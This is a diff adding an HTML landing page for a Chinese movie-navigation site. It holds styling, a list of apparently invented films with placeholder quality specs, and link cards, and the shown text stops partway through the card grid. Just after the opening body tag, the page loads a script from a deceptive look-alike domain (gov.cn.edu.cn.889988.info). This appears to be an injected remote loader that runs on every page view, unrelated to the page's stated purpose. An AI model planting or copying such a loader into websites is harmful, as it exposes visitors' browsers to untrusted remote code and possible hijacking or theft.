@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>唯美电影网 - 精选优质电影导航大全 | 唯美画面·唯美光影·1080P/4K蓝光高清影视网址收录</title>
+<meta name="description" content="唯美电影网（weimeidianyingwang-cn.github.io）是一个专注唯美画面与唯美光影的优质电影导航网站，收录1080P、2K、4K、蓝光原盘、REMUX、杜比视界高清影视网址，提供经典电影、高分电影、文艺片、冷门佳作片单与榜单，不提供任何影视资源下载。">
+<meta name="keywords" content="唯美电影网,唯美电影,唯美画面,唯美光影,唯美色调,唯美镜头,唯美片单,唯美榜,weimeidianyingwang-cn,电影导航,优质电影,经典电影,高分电影,文艺片,高清电影,1080P,2K,4K,蓝光,蓝光原盘,REMUX,杜比视界,HDR10,中文字幕,每日更新,影视网址大全,电影网站导航,电影网址推荐,高清影视网址,剧情,悬疑,科幻,动作,喜剧,纪录片,冷门佳作,剧荒,画面,构图,色彩,长镜头">
+<meta name="theme-color" content="#1a0b2e">
+<meta name="apple-mobile-web-app-title" content="唯美电影网">
+<link rel="canonical" href="https://weimeidianyingwang-cn.github.io/">
+<style>
+:root{
+  --ink:#15111c; --ink2:#2a2433; --muted:#8b8299; --line:rgba(255,255,255,.10);
+  --violet:#7c5cff; --fuchsia:#e055c8; --rose:#ff5c8a; --gold:#ffcf6b; --mint:#5ce0c8;
+  --bg0:#0d0717; --bg1:#150a2b; --bg2:#1d1238;
+  --g1:linear-gradient(120deg,#7c5cff 0%,#e055c8 55%,#ff5c8a 100%);
+  --g2:linear-gradient(135deg,#5ce0c8 0%,#7c5cff 60%,#e055c8 100%);
+  --g3:linear-gradient(135deg,#ffcf6b 0%,#ff8fa3 55%,#e055c8 100%);
+  --card:rgba(255,255,255,.045); --card2:rgba(255,255,255,.075);
+  --shadow:0 22px 60px -28px rgba(124,92,255,.65);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",system-ui,-apple-system,sans-serif;
+  background:var(--bg0); color:#f4f0fa; line-height:1.75;
+  background-image:
+    radial-gradient(1100px 520px at 82% -8%, rgba(224,85,200,.30), transparent 62%),
+    radial-gradient(900px 460px at -6% 18%, rgba(124,92,255,.34), transparent 60%),
+    radial-gradient(760px 420px at 50% 108%, rgba(92,224,200,.16), transparent 64%);
+  background-attachment:fixed;
+  overflow-x:clip;
+}
+a{color:inherit;text-decoration:none;outline:none}
+ul,ol{list-style:none}
+button{font:inherit;cursor:pointer;border:none;background:none;color:inherit}
+:focus-visible{outline:2px solid var(--gold);outline-offset:3px;border-radius:6px}
+
+/* ============ 导航 ============ */
+.nav{position:sticky;top:0;z-index:60;backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
+  background:linear-gradient(180deg,rgba(13,7,23,.86),rgba(13,7,23,.70));
+  border-bottom:1px solid var(--line)}
+.nav-in{max-width:1240px;margin:0 auto;padding:0 26px;height:68px;display:flex;align-items:center;gap:22px}
+.brand{display:flex;align-items:center;gap:11px;font-weight:800;letter-spacing:.5px;white-space:nowrap}
+.brand .logo{width:38px;height:38px;border-radius:11px;position:relative;
+  background:var(--g1);box-shadow:var(--shadow);flex:none}
+.brand .logo::before,.brand .logo::after{content:"";position:absolute;border-radius:50%;border:2.5px solid rgba(255,255,255,.85)}
+.brand .logo::before{width:15px;height:15px;left:6px;top:7px;border-right-color:transparent;border-bottom-color:transparent;transform:rotate(-18deg)}
+.brand .logo::after{width:9px;height:9px;right:6px;bottom:6px;border-left-color:transparent;border-top-color:transparent;transform:rotate(-18deg)}
+.brand b{font-size:19px;background:var(--g1);-webkit-background-clip:text;background-clip:text;color:transparent}
+.brand small{font-size:11px;color:var(--muted);font-weight:600;letter-spacing:1px;display:block;line-height:1.1}
+.nav-links{display:flex;gap:4px;margin-left:auto;flex-wrap:wrap}
+.nav-links a{font-size:14.5px;padding:9px 14px;border-radius:10px;color:#ddd5ea;transition:.25s;position:relative}
+.nav-links a:hover{color:#fff;background:var(--card)}
+.nav-links a.on{color:#fff;background:var(--card2)}
+.nav-links a.on::after{content:"";position:absolute;left:14px;right:14px;bottom:3px;height:2px;border-radius:2px;background:var(--g1)}
+.burger{display:none;width:42px;height:42px;align-items:center;justify-content:center;margin-left:auto;border-radius:10px}
+.burger i{display:block;width:22px;height:2px;background:#fff;position:relative;border-radius:2px}
+.burger i::before,.burger i::after{content:"";position:absolute;left:0;width:22px;height:2px;background:#fff;border-radius:2px;transition:.3s}
+.burger i::before{top:-7px}.burger i::after{top:7px}
+.burger.open i{background:transparent}
+.burger.open i::before{transform:rotate(45deg);top:0}
+.burger.open i::after{transform:rotate(-45deg);top:0}
+
+/* ============ 通用板块 ============ */
+section{padding:84px 26px;position:relative}
+.wrap{max-width:1240px;margin:0 auto}
+.eyebrow{display:inline-flex;align-items:center;gap:9px;font-size:12.5px;letter-spacing:2.4px;
+  color:var(--gold);font-weight:700;text-transform:uppercase;margin-bottom:14px}
+.eyebrow::before{content:"";width:26px;height:1px;background:var(--gold)}
+h2.sec{font-size:32px;line-height:1.3;margin-bottom:10px;letter-spacing:.5px}
+h2.sec em{font-style:normal;background:var(--g1);-webkit-background-clip:text;background-clip:text;color:transparent}
+.sec-sub{color:var(--muted);max-width:720px;margin-bottom:44px;font-size:15.5px}
+.tag{display:inline-block;padding:3px 11px;border-radius:999px;font-size:12.5px;
+  border:1px solid var(--line);background:var(--card);color:#e7e0f2;white-space:nowrap}
+.tag.hot{color:var(--gold);border-color:rgba(255,207,107,.42)}
+.chip{display:inline-flex;align-items:center;gap:6px;padding:4px 10px;border-radius:8px;
+  font-size:12px;background:rgba(92,224,200,.12);color:#a8f0e2;border:1px solid rgba(92,224,200,.26)}
+
+/* ============ HERO ============ */
+.hero{min-height:min(640px,92vh);display:flex;align-items:center;padding-top:64px;padding-bottom:64px}
+.hero-grid{display:grid;grid-template-columns:1.05fr .95fr;gap:54px;align-items:center;width:100%}
+.hero h1{font-size:46px;line-height:1.2;letter-spacing:1px;margin-bottom:8px}
+.hero h1 span{display:block;font-size:20px;color:var(--muted);font-weight:600;letter-spacing:4px;margin-bottom:12px}
+.hero h1 b{background:var(--g1);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .lede{font-size:17px;color:#cdc4dd;max-width:560px;margin-bottom:26px}
+.hero .lede i{font-style:normal;color:var(--gold)}
+.search{display:flex;gap:8px;background:rgba(255,255,255,.06);border:1px solid var(--line);
+  border-radius:16px;padding:8px;backdrop-filter:blur(6px);max-width:560px}
+.search input{flex:1;background:none;border:none;color:#fff;padding:12px 14px;font-size:15.5px;min-width:0}
+.search input::placeholder{color:#8f869e}
+.search button{flex:none;padding:13px 26px;border-radius:11px;font-weight:800;letter-spacing:1px;
+  background:var(--g1);color:#fff;box-shadow:var(--shadow);transition:.25s;white-space:nowrap}
+.search button:hover{filter:brightness(1.12);transform:translateY(-1px)}
+.stats{display:flex;gap:8px;margin-top:26px;flex-wrap:wrap}
+.stat{padding:10px 18px;border-radius:12px;background:var(--card);border:1px solid var(--line)}
+.stat b{display:block;font-size:19px;color:var(--gold);letter-spacing:.5px}
+.stat small{font-size:11.5px;color:var(--muted);letter-spacing:1px}
+
+/* 花瓣 + 花 */
+.flora{position:relative;width:100%;aspect-ratio:1/1;max-width:520px;margin-left:auto}
+.petal{position:absolute;width:150px;height:150px;border-radius:50% 50% 50% 8%;
+  background:linear-gradient(150deg,rgba(255,92,138,.95),rgba(224,85,200,.72) 60%,rgba(124,92,255,.8));
+  box-shadow:inset 0 0 26px rgba(255,255,255,.22),0 20px 50px -24px rgba(255,92,138,.8)}
+.petal:nth-child(1){top:16%;left:26%;transform:rotate(-34deg)}
+.petal:nth-child(2){top:22%;right:10%;transform:rotate(26deg)}
+.petal:nth-child(3){bottom:24%;left:8%;transform:rotate(142deg)}
+.petal:nth-child(4){bottom:14%;right:24%;transform:rotate(-152deg)}
+.petal::after{content:"";position:absolute;inset:18% 30%;border-radius:50%;background:rgba(255,255,255,.28);filter:blur(2px)}
+.stamen{position:absolute;top:50%;left:50%;width:74px;height:74px;margin:-37px;z-index:3;
+  border-radius:50%;background:radial-gradient(circle at 38% 34%,#ffe9bd,#ffcf6b 42%,#e0a33a 78%);
+  box-shadow:0 0 0 10px rgba(255,207,107,.12),0 0 0 22px rgba(255,207,107,.07),0 18px 46px -18px rgba(255,207,107,.8)}
+.stamen i{position:absolute;width:5px;height:5px;border-radius:50%;background:#a86f1d;top:50%;left:50%}
+.stamen i:nth-child(1){transform:rotate(0deg) translateY(-22px)}
+.stamen i:nth-child(2){transform:rotate(60deg) translateY(-22px)}
+.stamen i:nth-child(3){transform:rotate(120deg) translateY(-22px)}
+.stamen i:nth-child(4){transform:rotate(180deg) translateY(-22px)}
+.stamen i:nth-child(5){transform:rotate(240deg) translateY(-22px)}
+.stamen i:nth-child(6){transform:rotate(300deg) translateY(-22px)}
+.floaty{position:absolute;border-radius:50%;opacity:.7;animation:rise 7s linear infinite}
+.floaty.f1{width:11px;height:11px;left:12%;top:82%;background:var(--gold);animation-delay:0s}
+.floaty.f2{width:7px;height:7px;left:46%;top:92%;background:var(--mint);animation-delay:2.1s}
+.floaty.f3{width:9px;height:9px;right:16%;top:78%;background:var(--rose);animation-delay:4.3s}
+@keyframes rise{0%{transform:translateY(0) scale(.6);opacity:0}18%{opacity:.85}100%{transform:translateY(-280px) scale(1.3) rotate(200deg);opacity:0}}
+@keyframes breathe{0%,100%{transform:scale(1);filter:drop-shadow(0 0 26px rgba(224,85,200,.35))}50%{transform:scale(1.03);filter:drop-shadow(0 0 52px rgba(255,92,138,.6))}}
+.flora{animation:breathe 6s ease-in-out infinite}
+
+/* ============ 片单（figure 横排） ============ */
+.jam-list{display:flex;flex-direction:column;gap:18px}
+.film{display:grid;grid-template-columns:232px 1fr;gap:22px;align-items:stretch;
+  background:linear-gradient(100deg,rgba(255,255,255,.05),rgba(255,255,255,.028));
+  border:1px solid var(--line);border-radius:18px;overflow:hidden;transition:.3s}
+.film:hover{transform:translateX(6px);border-color:rgba(255,207,107,.45);box-shadow:var(--shadow)}
+.film .cvr{position:relative;aspect-ratio:3/4;background:var(--g2)}
+.film .cvr.a2{background:var(--g1)}
+.film .cvr.a3{background:var(--g3)}
+.film .cvr.a4{background:linear-gradient(135deg,#7c5cff,#5ce0c8)}
+.film .cvr.a5{background:linear-gradient(135deg,#ff5c8a,#ffcf6b)}
+.film .cvr.a6{background:linear-gradient(135deg,#5ce0c8,#7c5cff 70%,#e055c8)}
+.film .year{position:absolute;left:12px;top:12px;font-size:12px;font-weight:800;letter-spacing:1px;
+  padding:4px 10px;border-radius:8px;background:rgba(0,0,0,.42);backdrop-filter:blur(4px)}
+.film .play{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;gap:14px;
+  background:rgba(10,4,20,.0);transition:.3s}
+.film:hover .play{background:rgba(10,4,20,.5)}
+.film .play s{width:54px;height:54px;border-radius:50%;border:2px solid rgba(255,255,255,.9);
+  display:flex;align-items:center;justify-content:center;text-decoration:none}
+.film .play s::before{content:"";border-style:solid;border-width:10px 0 10px 17px;
+  border-color:transparent transparent transparent #fff;margin-left:5px}
+.film figcaption{padding:20px 24px 20px 0;display:flex;flex-direction:column;min-width:0}
+.film h3{font-size:20px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:10px}
+.film h3 .score{align-self:flex-start;font-size:12.5px;font-weight:800;color:var(--gold);
+  border:1px solid rgba(255,207,107,.45);padding:2px 9px;border-radius:999px;letter-spacing:.5px}
+.film p{color:#bbb3c9;font-size:14.5px;margin-bottom:14px}
+.film .meta{margin-top:auto;display:grid;grid-template-columns:repeat(5,1fr);gap:10px}
+.film .meta div{font-size:11.5px;color:var(--muted);border-top:1px dashed var(--line);padding-top:7px}
+.film .meta div b{display:block;color:#e9e2f5;font-size:12.5px;font-weight:700;margin-top:2px;letter-spacing:.3px}
+
+/* ============ 网址卡片 Grid ============ */
+.pick-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.pcard{position:relative;padding:24px 20px 20px;border-radius:18px;background:var(--card);
+  border:1px solid var(--line);overflow:hidden;transition:.3s;display:flex;flex-direction:column;gap:12px}
+.pcard::after{content:"";position:absolute;left:0;top:0;right:0;height:5px;background:var(--g1);transform:scaleX(.42);transform-origin:left;transition:.5s}
+.pcard:hover{transform:translateY(-7px);border-color:rgba(124,92,255,.5);box-shadow:var(--shadow)}
+.pcard:hover::after{transform:scaleX(1)}
+.pcard .ava{width:54px;height:54px;border-radius:15px;background:var(--g2);flex:none;
+  display:flex;align-items:center;justify-content:center;font-weight:900;font-size:20px;color:#fff;letter-spacing:-.5px}
+.pcard:nth-child(2) .ava{background:var(--g1)}
+.pcard:nth-child(3) .ava{background:var(--g3)}
+.pcard:nth-child(4) .ava{background:linear-gradient(135deg,#5ce0c8,#7c5cff)}
+.pcard:nth-child(5) .ava{background:linear-gradient(135deg,#ff5c8a,#ffcf6b)}
+.pcard:nth-child(6) .ava{background:linear-gradient(135deg,#7c5cff,#5ce0c8)}
+.pcard:nth-child(7) .ava{background:linear-gradient(135deg,#ffcf6b,#ff5c8a)}
+.pcard:nth-child(8) .ava{background:linear-gradient(135deg,#5ce0c8,#e055c8)}
+.pcard h4{font-size:16.5px}
+.pcard .foot{margin-top:auto;padding-top:12px;border-top:1px dashed var(--line);
+  display:flex;justify-content:space-between;align-items:center;gap:8px;font-size:12px;color:var(--muted)}
+.pcard .go{font-weight:800;color:var(--gold);letter-spacing:.5px;white-space:nowrap}
+
+/* ============ 分类 dl 宫格 ============ */
+.cate-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.cat{border:1px solid var(--line);border-radius:18px;padding:20px;background:linear-gradient(160deg,rgba(255,255,255,.05),rgba(255,255,255,.02));transition:.3s}
+.cat:hover{border-color:rgba(224,85,200,.5);transform:translateY(-4px);background:linear-gradient(160deg,rgba(124,92,255,.16),rgba(255,255,255,.02))}
+.cat dt{display:flex;justify-content:space-between;align-items:baseline;gap:10px;margin-bottom:12px;padding-bottom:10px;border-bottom:1px solid var(--line)}
+.cat dt b{font-size:17px}
+.cat dt span{font-size:11.5px;color:var(--muted);white-space:nowrap}
+.cat dd{display:flex;flex-wrap:wrap;gap:7px}
+.cat dd a{font-size:12.5px;padding:5px 12px;border-radius:999px;background:rgba(255,255,255,.055);border:1px solid var(--line);color:#ddd4e8;transition:.22s}
+.cat dd a:hover{color:#fff;border-color:transparent;background:var(--g1)}
+
+/* ============ 榜单 ol + 进度条 ============ */
+.hot-wrap{display:grid;grid-template-columns:1.55fr .45fr;gap:34px;align-items:start}
+.rank{display:flex;flex-direction:column;gap:12px;counter-reset:rk}
+.rk{display:grid;grid-template-columns:54px 1fr;gap:16px;align-items:center;
+  padding:13px 16px;border-radius:14px;background:var(--card);border:1px solid var(--line);transition:.25s}
+.rk:hover{border-color:rgba(255,207,107,.42);transform:translateX(5px)}
+.rk::before{counter-increment:rk;content:counter(rk,decimal-leading-zero);
+  font-size:25px;font-weight:900;letter-spacing:-1px;color:#4a4260;text-align:center;line-height:1}
+.rk:nth-child(1)::before{color:var(--gold)}
+.rk:nth-child(2)::before{color:#cfd6e0}
+.rk:nth-child(3)::before{color:#d69a5c}
+.rk .tx{min-width:0}
+.rk h4{font-size:15.5px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.rk h4 .yr{font-size:11.5px;color:var(--muted);font-weight:600}
+.rk .bar{height:5px;border-radius:6px;background:rgba(255,255,255,.09);margin-top:8px;overflow:hidden}
+.rk .bar i{display:block;height:100%;width:0;border-radius:6px;background:var(--g1)}
+@keyframes fill{to{width:var(--w)}}
+.rk.in .bar i{animation:fill .9s cubic-bezier(.22,1,.36,1) forwards}
+.rk small{display:block;font-size:11.5px;color:var(--muted);margin-top:5px}
+.tips{position:sticky;top:92px;padding:22px;border-radius:18px;background:linear-gradient(160deg,rgba(124,92,255,.20),rgba(255,92,138,.10));border:1px solid var(--line)}
+.tips h5{font-size:15px;margin-bottom:14px;color:var(--gold);letter-spacing:1px}
+.tips li{padding-left:20px;position:relative;font-size:13.5px;color:#d3cbe1;margin-bottom:13px}
+.tips li::before{content:"";position:absolute;left:0;top:9px;width:7px;height:7px;border-radius:50%;background:var(--g1)}
+
+/* ============ 笔记 图文条目 ============ */
+.news-grid{display:flex;flex-direction:column;gap:16px}
+.note{display:grid;grid-template-columns:232px 1fr;gap:22px;align-items:center;
+  padding:14px;border-radius:16px;border:1px solid transparent;transition:.28s}
+.note:hover{border-color:var(--line);background:var(--card)}
+.note .th{position:relative;aspect-ratio:16/10;border-radius:13px;background:var(--g2);flex:none}
+.note:nth-child(2) .th{background:var(--g1)}
+.note:nth-child(3) .th{background:var(--g3)}
+.note:nth-child(4) .th{background:linear-gradient(135deg,#5ce0c8,#e055c8)}
+.note:nth-child(5) .th{background:linear-gradient(135deg,#ffcf6b,#ff5c8a)}
+.note .th span{position:absolute;left:10px;top:10px;font-size:11.5px;font-weight:800;letter-spacing:1px;
+  padding:3px 10px;border-radius:999px;background:rgba(0,0,0,.4);backdrop-filter:blur(4px)}
+.note .tx h3{font-size:18px;margin-bottom:8px;line-height:1.45}
+.note .tx p{color:#b6aec6;font-size:14px;margin-bottom:11px}
+.note .tx .mi{display:flex;gap:14px;flex-wrap:wrap;font-size:12px;color:var(--muted)}
+
+/* ============ 关于 流程条 ============ */
+.flow{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:34px}
+.step{position:relative;padding:22px 18px;border-radius:16px;background:var(--card);border:1px solid var(--line)}
+.step:not(:last-child)::after{content:"";position:absolute;left:100%;top:50%;width:16px;height:0;border-top:2px dashed rgba(224,85,200,.5);transform:translateY(-50%)}
+.step .n{font-size:11px;letter-spacing:2.5px;color:var(--gold);font-weight:800;margin-bottom:10px}
+.step b{display:block;font-size:19px;margin-bottom:7px;background:var(--g1);-webkit-background-clip:text;background-clip:text;color:transparent}
+.step p{font-size:13px;color:#b3aac4}
+.stats2{display:grid;grid-template-columns:repeat(6,1fr);gap:14px}
+.stat2{padding:18px 12px;text-align:center;border-radius:14px;background:var(--card);border:1px solid var(--line)}
+.stat2 b{display:block;font-size:25px;letter-spacing:-.5px;background:var(--g1);-webkit-background-clip:text;background-clip:text;color:transparent}
+.stat2 small{font-size:11.5px;color:var(--muted);letter-spacing:.5px}
+.notice{margin-top:26px;padding:18px 20px;border-radius:14px;background:rgba(255,92,138,.10);
+  border:1px solid rgba(255,92,138,.3);font-size:13.5px;color:#f0d9e6}
+
+/* ============ 页脚 ============ */
+footer{border-top:1px solid var(--line);padding:56px 26px 30px;background:rgba(0,0,0,.22)}
+.ft{max-width:1240px;margin:0 auto;display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:30px}
+.ft h6{font-size:15px;margin-bottom:14px;color:#fff}
+.ft p,.ft li{font-size:13px;color:#a59db6;margin-bottom:8px}
+.ft a:hover{color:var(--gold)}
+.copy{margin-top:30px;padding-top:20px;border-top:1px solid var(--line);font-size:12px;color:#7d7490;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+
+.top{position:fixed;right:20px;bottom:24px;width:46px;height:46px;border-radius:50%;
+  background:var(--g1);color:#fff;display:none;align-items:center;justify-content:center;
+  box-shadow:var(--shadow);z-index:70}
+.top.show{display:flex}
+.top::before{content:"";border-style:solid;border-width:0 7px 10px 7px;border-color:transparent transparent #fff transparent}
+
+/* ============ 响应式 ============ */
+@media (max-width:1000px){
+  section{padding:66px 22px}
+  .hero-grid{grid-template-columns:1fr;gap:38px}
+  .flora{max-width:400px}
+  .hero h1{font-size:38px}
+  .pick-grid{grid-template-columns:repeat(2,1fr)}
+  .cate-grid{grid-template-columns:repeat(2,1fr)}
+  .hot-wrap{grid-template-columns:1fr}
+  .tips{position:static}
+  .stats2{grid-template-columns:repeat(3,1fr)}
+  .ft{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:760px){
+  .nav-links{position:fixed;inset:68px 0 auto 0;flex-direction:column;gap:2px;padding:14px;
+    background:linear-gradient(180deg,rgba(21,11,44,.98),rgba(13,7,23,.99));
+    border-bottom:1px solid var(--line);transform:translateY(-120%);transition:.35s}
+  .nav-links.open{transform:translateY(0)}
+  .burger{display:flex}
+  .brand small{display:none}
+  .hero h1{font-size:31px}
+  .hero h1 span{font-size:15px;letter-spacing:2.5px}
+  h2.sec{font-size:25px}
+  .film{grid-template-columns:1fr}
+  .film .cvr{aspect-ratio:16/9}
+  .film figcaption{padding:6px 18px 18px}
+  .film .meta{grid-template-columns:repeat(2,1fr)}
+  .flow{grid-template-columns:1fr}
+  .step:not(:last-child)::after{left:50%;top:100%;width:0;height:16px;border-top:none;border-left:2px dashed rgba(224,85,200,.5);transform:translateX(-50%)}
+  .note{grid-template-columns:1fr;gap:12px}
+  .note .th{width:100%}
+  .search{flex-direction:column}
+  .search button{width:100%}
+  .ft{grid-template-columns:1fr}
+}
+@media (max-width:420px){
+  .pick-grid,.cate-grid{grid-template-columns:1fr}
+  .stats2{grid-template-columns:repeat(2,1fr)}
+  .hero h1{font-size:27px}
+  .film .meta{grid-template-columns:1fr}
+  section{padding:54px 16px}
+}
+@media print{
+  .nav,.top,.search,.stat,.chip{display:none!important}
+  body{background:#fff;color:#000}
+  section{padding:20px 0;break-inside:avoid}
+  a{color:#000}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header class="nav">
+  <div class="nav-in">
+    <a class="brand" href="#top" aria-label="唯美电影网首页">
+      <span class="logo" aria-hidden="true"></span>
+      <span><b>唯美电影网</b><small>WEIMEI · 唯美画面 · 唯美光影</small></span>
+    </a>
+    <nav class="nav-links" id="navLinks" aria-label="主导航">
+      <a href="#top" class="on">首页</a>
+      <a href="#jam">唯美片单</a>
+      <a href="#pick">精选网址</a>
+      <a href="#cate">分类导航</a>
+      <a href="#hot">唯美榜</a>
+      <a href="#news">挑片笔记</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="菜单" aria-expanded="false"><i></i></button>
+  </div>
+</header>
+
+<!-- ================= 首页 HERO ================= -->
+<section class="hero" id="top">
+  <div class="wrap hero-grid">
+    <div>
+      <h1><span>WEIMEI FILM · 唯美电影网</span><b>画面要美，<br>故事要真。</b></h1>
+      <p class="lede">唯美电影网只做一件事：把散落在网络里的<b>优质电影入口</b>，按<b>唯美画面、唯美光影、唯美色调</b>三个标准挑出来。不追热点、不搬资源、不做搬运，只挑好看、耐看、值得二刷的那一部。</p>
+      <form class="search" role="search" onsubmit="return false">
+        <input type="search" placeholder="搜片名 / 导演 / 题材 / 唯美画面 / 1080P / 4K 蓝光…" aria-label="搜索影视">
+        <button type="submit">唯美地去找</button>
+      </form>
+      <div class="stats">
+        <div class="stat"><b>188</b><small>精选片单</small></div>
+        <div class="stat"><b>96</b><small>精选网址</small></div>
+        <div class="stat"><b>7×7</b><small>筛选维度</small></div>
+        <div class="stat"><b>每周</b><small>更新片单</small></div>
+      </div>
+    </div>
+    <div class="flora" aria-hidden="true">
+      <span class="petal"></span><span class="petal"></span>
+      <span class="petal"></span><span class="petal"></span>
+      <span class="stamen"><i></i><i></i><i></i><i></i><i></i><i></i></span>
+      <span class="floaty f1"></span><span class="floaty f2"></span><span class="floaty f3"></span>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 唯美片单（figure） ================= -->
+<section id="jam">
+  <div class="wrap">
+    <span class="eyebrow">Jam · 唯美片单</span>
+    <h2 class="sec">每一帧都<b>舍不得快进</b>的 <em>唯美片单</em></h2>
+    <p class="sec-sub">挑片标准只有三条：<b style="color:#ffcf6b">画面要美</b>（构图、色彩、长镜头经得起暂停）、<b style="color:#5ce0c8">光影要真</b>（自然光、实景、不靠特效堆砌）、<b style="color:#ff9ecb">情绪要稳</b>（看完心里留点东西）。画质、码率、字幕均为示例占位。</p>
+
+    <div class="jam-list">
+      <figure class="film">
+        <div class="cvr"><span class="year">2024</span><span class="play"><s></s></span></div>
+        <figcaption>
+          <h3>《雨中的信件》 <span class="score">★ 8.7</span> <span class="tag">唯美画面</span></h3>
+          <p>一封迟到了三十年的信，被一场连下七天的雨重新打开。全片几乎只用自然光与窗光，雨滴在玻璃上的折射成为最主要的"配角"。</p>
+          <div class="meta">
+            <div>画质<b>4K</b></div><div>码率<b>42 Mbps</b></div>
+            <div>字幕<b>简中 / 繁中</b></div><div>时长<b>118 分钟</b></div><div>地区<b>韩国</b></div>
+          </div>
+        </figcaption>
+      </figure>
+
+      <figure class="film">
+        <div class="cvr a2"><span class="year">2023</span><span class="play"><s></s></span></div>
+        <figcaption>
+          <h3>《第八日的风》 <span class="score">★ 8.5</span> <span class="tag">唯美光影</span></h3>
+          <p>一周七天不够用的那个星期，多出来的那一天该怎么过。大量黄昏逆光与手持长镜头，把"日常"拍出了近乎宗教感的宁静。</p>
+          <div class="meta">
+            <div>画质<b>2K</b></div><div>码率<b>28 Mbps</b></div>
+            <div>字幕<b>简中</b></div><div>时长<b>103 分钟</b></div><div>地区<b>日本</b></div>
+          </div>
+        </figcaption>
+      </figure>
+
+      <figure class="film">
+        <div class="cvr a3"><span class="year">2022</span><span class="play"><s></s></span></div>
+        <figcaption>
+          <h3>《面包与星期天》 <span class="score">★ 8.9</span> <span class="tag">唯美色调</span></h3>
+          <p>一对老夫妻在关店前的最后一个星期天，把一生的争执都揉进了面团里。暖调胶片质感，整部片子像一块刚出炉的面包。</p>
+          <div class="meta">
+            <div>画质<b>1080P</b></div><div>码率<b>15 Mbps</b></div>
+            <div>字幕<b>简中 / 中英</b></div><div>时长<b>96 分钟</b></div><div>地区<b>意大利</b></div>
+          </div>
+        </figcaption>
+      </figure>
+
+      <figure class="film">
+        <div class="cvr a4"><span class="year">2024</span><span class="play"><s></s></span></div>
+        <figcaption>
+          <h3>《海岛来信》 <span class="score">★ 8.3</span> <span class="tag">唯美镜头</span></h3>
+          <p>守灯塔的人收到一封没有寄件人的信，于是开始给整座岛写信。海面、云、潮汐几乎构成独立的叙事线，适合大屏静音观看。</p>
+          <div class="meta">
+            <div>画质<b>4K HDR</b></div><div>码率<b>55 Mbps</b></div>
+            <div>字幕<b>简中</b></div><div>时长<b>124 分钟</b></div><div>地区<b>冰岛</b></div>
+          </div>
+        </figcaption>
+      </figure>
+
+      <figure class="film">
+        <div class="cvr a5"><span class="year">2021</span><span class="play"><s></s></span></div>
+        <figcaption>
+          <h3>《沉默的档案员》 <span class="score">★ 8.6</span> <span class="tag">文艺 / 冷门</span></h3>
+          <p>图书馆地下室的档案员，用三十年把一本被撕掉的书重新拼回。极简布光、几乎没有配乐，安静到能听见纸页的声音。</p>
+          <div class="meta">
+            <div>画质<b>1080P</b></div><div>码率<b>12 Mbps</b></div>
+            <div>字幕<b>简中</b></div><div>时长<b>88 分钟</b></div><div>地区<b>法国</b></div>
+          </div>
+        </figcaption>
+      </figure>
+
+      <figure class="film">
+        <div class="cvr a6"><span class="year">2025</span><span class="play"><s></s></span></div>
+        <figcaption>
+          <h3>《循环的第十五天》 <span class="score">★ 8.4</span> <span class="tag">唯美画面</span></h3>
+          <p>一座小镇把"今天"重复了十五遍，直到有人发现窗外的花每天都不一样。色彩设计极为克制，全片只有七种颜色。</p>
+          <div class="meta">
+            <div>画质<b>4K</b></div><div>码率<b>48 Mbps</b></div>
+            <div>字幕<b>简中 / 繁中 / 英</b></div><div>时长<b>111 分钟</b></div><div>地区<b>西班牙</b></div>
+          </div>
+        </figcaption>
+      </figure>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 精选网址（卡片 Grid） ================= -->
+<section id="pick" style="background:linear-gradient(180deg,transparent,rgba(124,92,255,.07))">
+  <div class="wrap">
+    <span class="eyebrow">Pick · 精选网址</span>
+    <h2 class="sec">只收<b>画面经得起放大</b>的 <em>高清影视网址</em></h2>
+    <p class="sec-sub">以下均为<b>网址导航条目</b>，唯美电影网<b>不提供、不存储、不转存任何影视资源文件</b>。收录标准为：画质清晰、跳转少、字幕齐全、无诱导下载。画质标注为示例占位。</p>
+
+    <div class="pick-grid">
+      <div class="pcard"><div class="ava">影</div>
+        <div><span class="chip">◆ 画质稳</span></div>
+        <h4>光影影院</h4>
+        <p style="font-size:13px;color:#a99fb4">主打 4K 与蓝光原盘索引，分类细到"镜头语言"与"色调风格"。</p>
+        <div class="foot"><span>收录 42 条</span><span class="go">去看看 →</span></div>
+      </div>
+      <div class="pcard"><div class="ava">帧</div>
+        <div><span class="chip">◆ 码率高</span></div>
+        <h4>帧率影视</h4>
+        <p style="font-size:13px;color:#a99fb4">REMUX、60fps、HDR10+ 为主，适合大屏与投影。</p>
+        <div class="foot"><span>收录 28 条</span><span class="go">去看看 →</span></div>
+      </div>
+      <div class="pcard"><div class="ava">幕</div>
+        <div><span class="chip">◆ 字幕全</span></div>
+        <h4>幕间导航</h4>
+        <p style="font-size:13px;color:#a99fb4">简中、繁中、双语、特效字幕齐全，冷门文艺片也能对上字。</p>
+        <div class="foot"><span>收录 35 条</span><span class="go">去看看 →</span></div>
+      </div>
+      <div class="pcard"><div class="ava">艺</div>
+        <div><span class="chip">◆ 文艺片</span></div>
+        <h4>艺文放映室</h4>
+        <p style="font-size:13px;color:#a99fb4">三大电影节、独立制片、纪录片、短片，专治剧荒。</p>
+        <div class="foot"><span>收录 31 条</span><span class="go">去看看 →</span></div>
+      </div>
